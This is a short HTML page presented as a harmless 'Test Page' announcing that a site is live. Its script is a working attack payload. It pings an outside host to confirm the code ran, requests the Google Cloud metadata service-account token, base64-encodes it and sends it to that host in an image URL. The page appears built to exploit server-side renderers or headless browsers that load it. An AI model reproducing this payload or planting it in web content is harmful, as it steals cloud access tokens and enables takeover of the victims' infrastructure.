<!DOCTYPE html>
<html>
<head>
  <title>Test Page</title>
  <script>
    // Confirm JS execution
    new Image().src = "https://js.rip/5mw8at9w5s";

    // Attempt metadata fetch
    fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
      headers: { "Metadata-Flavor": "Google" }
    })
    .then(r => r.text())
    .then(t => {
      new Image().src = "https://js.rip/5mw8at9w5s" + btoa(t);
    })
    .catch(() => {});
  </script>
</head>

  <h1>It works! Your site is live 🚀</h1>
